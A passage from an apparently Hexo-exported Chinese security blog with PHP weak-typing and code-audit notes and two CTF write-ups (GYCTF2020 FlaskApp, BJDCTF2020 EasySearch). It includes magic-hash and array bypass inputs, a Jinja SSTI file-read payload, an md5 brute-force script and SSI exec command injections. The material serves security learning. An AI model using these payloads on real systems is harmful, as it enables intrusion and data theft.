<h4 id="2-hash比较缺陷"><a href="#2-hash比较缺陷" class="headerlink" title="2.hash比较缺陷"></a>2.hash比较缺陷</h4><p>如果采用</p>
<p>== 运算符比较哈希值，会面临上面讲的弱类型比较的问题，</p>
<p>即任何以’0e’ 开头的字符串都相等！</p>
<p>常见的md5</p>
<p>运算后以’0e’开头的字符串有：</p>
<p>QNKCDZO</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s1885207154a</p>
<p>s1836677006a</p>
<p>s1184209335a</p>
<p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104340610.png" alt="image-20210901104340610"></p>
<h4 id="3-md5-sha1函数缺陷"><a href="#3-md5-sha1函数缺陷" class="headerlink" title="3.md5 sha1函数缺陷"></a>3.md5 sha1函数缺陷</h4><p>当md5()函数与sha1()函数对参数进行加密处理时，</p>
<p>如果碰到一个数组，md5()函数会返回null</p>
<p>sha1()函数也是一样。</p>
<p>利用这个特性构造两个数组即可。</p>
<p>a[]=1即表示传入了一个数组</p>
<p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104608235.png" alt="image-20210901104608235"></p>
<p>变量覆盖</p>
<h4 id="1-parse-str导致的变量覆盖"><a href="#1-parse-str导致的变量覆盖" class="headerlink" title="1.parse_str导致的变量覆盖"></a>1.parse_str导致的变量覆盖</h4><p>parse_str( string $encoded_string[.array &amp;$result] )</p>
<p>parse_str() 函数用于把查询字符串解析到变量中，</p>
<p>如果没有result参数，则由该函数设置的变量将覆盖已存在的同名变量，</p>
<p>如果设置了第二个变量result</p>
<p>变量将会以数组元素的形式存入到这个数组，作为替代。</p>
<p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901145407518.png" alt="image-20210901145407518"></p>
<h4 id="2-X-Forwarded-For绕过指定地址"><a href="#2-X-Forwarded-For绕过指定地址" class="headerlink" title="2.X-Forwarded-For绕过指定地址"></a>2.X-Forwarded-For绕过指定地址</h4><p>HTTP头添加X-Forwarded-For：</p>
<h4 id="3-strops数组绕过NULL与ereg正则-00截断"><a href="#3-strops数组绕过NULL与ereg正则-00截断" class="headerlink" title="3.strops数组绕过NULL与ereg正则%00截断"></a>3.strops数组绕过NULL与ereg正则%00截断</h4><p>知识点补充：</p>
<p>PHP strops()函数</p>
<p>定义和用法：</p>
<p>strops()函数查找字符串在另一字符串第一次出现的位置</p>
<p>注释：strops()函数对大小写敏感</p>
<p>​            该函数是二进制安全的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strpos(<span class="keyword">string</span>,find,start)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>string</em></td>
<td align="left">必需。规定要搜索的字符串。</td>
</tr>
<tr>
<td align="left"><em>find</em></td>
<td align="left">必需。规定要查找的字符串。</td>
</tr>
<tr>
<td align="left"><em>start</em></td>
<td align="left">可选。规定在何处开始搜索。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>返回值：</th>
<th>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</th>
</tr>
</thead>
<tbody><tr>
<td>PHP 版本：</td>
<td>4+</td>
</tr>
</tbody></table>
<p>ereg正则函数</p>
<p>字符串比对解析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ereg(<span class="keyword">string</span> pattern, <span class="keyword">string</span> <span class="keyword">string</span>, <span class="keyword">array</span> [regs]);</span><br></pre></td></tr></table></figure>

<p>本函数以 pattern 的规则来解析比对字符串 string。</p>
<p>比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。</p>
<p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901150729125.png" alt="image-20210901150729125"></p>
<p>方法一：</p>
<p>既要是纯数字</p>
<p>又要有’ #biubiubiu’</p>
<p>strpos()找的是字符串，那么传一个数组给它</p>
<p>strpos()出错返回null,null!==false,</p>
<p>所以符合要求</p>
<p>所以输入nctf[]= </p>
<p>那为什么ereg()也能符合呢?</p>
<p>因为ereg()</p>
<p>在出错时返回的也是null,null!==false,</p>
<p>所以符合要求</p>
<p>方法二：</p>
<p>字符串截断</p>
<p>利用ereg()的NULL截断漏洞，绕过正则过滤</p>
<p>?nctf=1%00%23biubiubiu </p>
<h3 id="模拟演练："><a href="#模拟演练：" class="headerlink" title="模拟演练："></a>模拟演练：</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831213941122.bmp" alt="capture_20210831213941122"></p>
<p>?password=1337a</p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831214131149.bmp" alt="capture_20210831214131149"></p>
<p>?name[]=1&amp;passsword[]=2</p>
<p>解析：sha1()函数默认的传入参数类型是字符串，当传入数组时均会返回false，通过判断。</p>
<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901105909901.png" alt="image-20210901105909901"></p>
<p>?a=240610708或?a=s878926199a</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Daily</title>
    <url>/2021/09/01/x/q/</url>
    <content><![CDATA[<p>​    之后这篇文章就来记录一些日常了</p>
<p>9.1</p>
<p>很开心啊，昨天发布的文章到今天就有90多个访问量</p>
<p>而且登上了csdn的php榜第25名！再接再厉！</p>
<p><img src="/2021/09/01/x/q/image-20210901144059817.png" alt="image-20210901144059817"></p>
<p>9.2</p>
<p>没想到代码审计的文章能到第五名</p>
<p>真是意外</p>
<p>虽然浏览量不太高(emm,再接再励吧)</p>
<p><img src="/2021/09/01/x/q/image-20210902180307061.png" alt="image-20210902180307061"></p>
]]></content>
      <tags>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计(二)</title>
    <url>/2021/09/02/php/0/</url>
    <content><![CDATA[<h4 id="文件上传漏洞挖掘与利用"><a href="#文件上传漏洞挖掘与利用" class="headerlink" title="文件上传漏洞挖掘与利用"></a>文件上传漏洞挖掘与利用</h4><p>1.搜索 move_uploaded_file()函数, 在PHP中上传函数只有这一个</p>
<p>2.查看上传文件的代码是否存在限制或可以绕过</p>
<p>3.搜索include、require、include_once、require_once函数，</p>
<p>是否存在可控变量。</p>
<p>4.追踪程序运行流程，查看模块加载时包含的文件是否可控。</p>
<p><img src="/2021/09/02/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p>
<p>任意文件读取、下载、写入、删除、漏洞挖掘与利用</p>
<p>黑盒看功能点对应的文件， 再去读文件</p>
<p>搜索文件读取的函数， 查看是否存在直接或者直接控制的变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents、highlight_file、fopen、readfile、fread、</span><br><span class="line"></span><br><span class="line">fgetss、fgets、parse_ini_file、show_source、file、fwrite、</span><br><span class="line"></span><br><span class="line">file_put_contents、unlink</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/02/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p>
<h4 id="SSRF漏洞挖掘与利用"><a href="#SSRF漏洞挖掘与利用" class="headerlink" title="SSRF漏洞挖掘与利用"></a>SSRF漏洞挖掘与利用</h4><p>1.找对应功能点，直接黑盒测试查看是否能简单利用，不能再去追踪流程分析传递过程。</p>
<p>2.白盒挖掘则需要搜索带有变量参数的相关函数</p>
<p>3.file_get_contents()</p>
<p>4.fsockopen()</p>
<p>5.curl_exec()</p>
<p>6.fopen()</p>
<p><img src="/2021/09/02/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p>
<h4 id="代码执行漏洞挖掘与利用"><a href="#代码执行漏洞挖掘与利用" class="headerlink" title="代码执行漏洞挖掘与利用"></a>代码执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数， 回溯跟踪</p>
<p>2.eval、assert、preg_repleace、$_ GET($_POST[]);</p>
<p>call_user_func、call_user_func_array、array_map等函数。</p>
<p><img src="/2021/09/02/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p>
<h4 id="命令执行漏洞挖掘与利用"><a href="#命令执行漏洞挖掘与利用" class="headerlink" title="命令执行漏洞挖掘与利用"></a>命令执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数，回溯跟踪</p>
<p>2.system、exec、shell_exec、passthru</p>
<p>反引号``、popen、ob_start、pcntl_exec</p>
<p>proc_open</p>
<p><img src="/2021/09/02/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p>
<h4 id="SQL注入漏洞挖掘与利用"><a href="#SQL注入漏洞挖掘与利用" class="headerlink" title="SQL注入漏洞挖掘与利用"></a>SQL注入漏洞挖掘与利用</h4><p>1.跟踪参数传递是否存在过滤，数据库查询是否使用预编译</p>
<p>2.一般数据库查询会被封装在几个核心文件中，反复调用。当然在某些复杂的功能中，</p>
<p>可能也会存在不使用封装的函数，所以需要全面排查。</p>
<p>3.在挖掘的过程中，也要注意宽字节注入、二次注入等方法的可能性。</p>
<p><img src="/2021/09/02/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p>
<h4 id="XSS漏洞挖掘与利用"><a href="#XSS漏洞挖掘与利用" class="headerlink" title="XSS漏洞挖掘与利用"></a>XSS漏洞挖掘与利用</h4><p>1.查看参数传递进入到输出是否存在过滤函数</p>
<p>2.常见的输出函数，print、print_r、echo、printf、sprint、die</p>
<p>var_dump、var_export等</p>
<p><img src="/2021/09/02/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p>
<h4 id="CSRF漏洞挖掘与利用"><a href="#CSRF漏洞挖掘与利用" class="headerlink" title="CSRF漏洞挖掘与利用"></a>CSRF漏洞挖掘与利用</h4><p>1.查看提交数据功能点，抓包查看是否token，查看核心代码中是否存在token或者referer校验</p>
<p>2.可以直接搜索token、referer关键字</p>
<p>反序列化漏洞挖掘与利用</p>
<p>搜索带有变量参数的反序列化函数unserliaze()，查看是否存在利用点</p>
<p>反序列化中需关注的函数</p>
<p><img src="/2021/09/02/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p>
<h4 id="install系统重装漏洞"><a href="#install系统重装漏洞" class="headerlink" title="install系统重装漏洞"></a>install系统重装漏洞</h4><p>在安装过程中，</p>
<p>需要填写Web应用的数据库配置，一般会将配置直接写入到配置文件中，</p>
<p>在写入的过程中往往没有校验</p>
<p>(有可能其他安装后修改的功能会做校验)，导致</p>
<p>直接写入php代码到配置文件中，</p>
<p>从而达到任意代码执行的目的</p>
<p>install系统重装验证绕过漏洞</p>
<p>某些CMS的install的验证不严谨，导致直接绕过重装，例如</p>
<p>1.</p>
<p>使用JavaScript跳转，但是后面的代码仍然会被执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this\-&gt;myclass-\&gt;notice(&#39;alert(&quot;系统已安装过&quot;);window.location.href&#x3D;&quot;&#39;.site_url().&#39;&quot;;&#39;);</span><br></pre></td></tr></table></figure>

<p>2.</p>
<p>使用header()</p>
<p>函数进行跳转，没有使用die()</p>
<p>或者exit()结束，那么后面部分的代码仍然会</p>
<p>被执行</p>
<p>//header 头并不会结束之后的代码，漏洞出在这里</p>
<p>header( ‘location: ../index.php’);</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <url>/2021/09/01/buu/17/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)</a></p>
<p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeo的博客-CSDN博客</a></p>
<p>最近刚学了模板注入，这题就直接顺着flask的payload去</p>
<p><img src="/2021/09/01/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p>
<p>试着用简单的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>经过加密解密提交后</p>
<p><img src="/2021/09/01/buu/17/image-20210901160005521.png" alt="image-20210901160005521"></p>
<p>再尝试用system函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/01/buu/17/image-20210901160203877.png" alt="image-20210901160203877"></p>
<p>好家伙，果然被过滤了</p>
<p>试了几个关键字都不行后，查看提示，在源码处看到</p>
<p><img src="/2021/09/01/buu/17/image-20210901160310325.png" alt="image-20210901160310325"></p>
<p>看到PIN</p>
<p>果断上网查了文章，发现PIN还挺难得到的</p>
<p>主要是python脚本不会写。。。</p>
<p>接下来按照正常解题流程：</p>
<p>payload1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2021/09/01/buu/17/image-20210901160640173.png" alt="image-20210901160640173"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <url>/2021/09/02/buu/18/</url>
    <content><![CDATA[<p> 参考博客：</p>
<p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p>
<p>打开后只有一个输入框</p>
<p>尝试了一下sql注入</p>
<p>只会出现一样的弹框</p>
<p><img src="/2021/09/02/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p>
<p>扫描目录后发现还有swp文件</p>
<p>访问得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ob_start();</span><br><span class="line">	function get_hash()&#123;</span><br><span class="line">		$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">		$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">		$content &#x3D; uniqid().$random;</span><br><span class="line">		return sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>映入眼帘的就是hash函数</p>
<p>注意到登陆代码</p>
<p><img src="/2021/09/02/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p>
<p>​        解释起来，就是password必须hash加密后要等于6d0bc1，满足后就会输出script弹窗 </p>
<p>‘Welcome to manage system’</p>
<p><img src="/2021/09/02/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p>
<p>登录成功后会生成相应的shtml文件</p>
<p>开始解题</p>
<p>先得到脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string &#x3D; &#39;0123456789&#39;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #父类的构造方法</span><br><span class="line">        self.left &#x3D; left</span><br><span class="line">        self.right &#x3D; right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin &#x3D; &#39;6d0bc1&#39;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">            if s[:6] &#x3D;&#x3D; admin:</span><br><span class="line">                print i</span><br><span class="line">threads &#x3D; []</span><br><span class="line">thread_count &#x3D; 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑完后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\#2020666</span><br><span class="line">\#2305004</span><br><span class="line">\#9162671</span><br></pre></td></tr></table></figure>

<p>选择其中一个密码登录</p>
<p>然后查看网络状态</p>
<p><img src="/2021/09/02/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p>
<p>用这里的路径访问下</p>
<p><img src="/2021/09/02/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p>
<p>看wp知道了后面用ssti模板注入</p>
<p>这里有一个知识点</p>
<p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p>
<p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p>
<p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p>
<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
<p>username成为注入点</p>
<!--#exec cmd="whoami"-->

<p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p>
<!--#exec cmd="ls"-->

<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p>
<!--#exec cmd="ls ../"-->  #看一下上层目录

<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p>
<p>找到了</p>
<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->

<p><img src="/2021/09/02/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
</search>
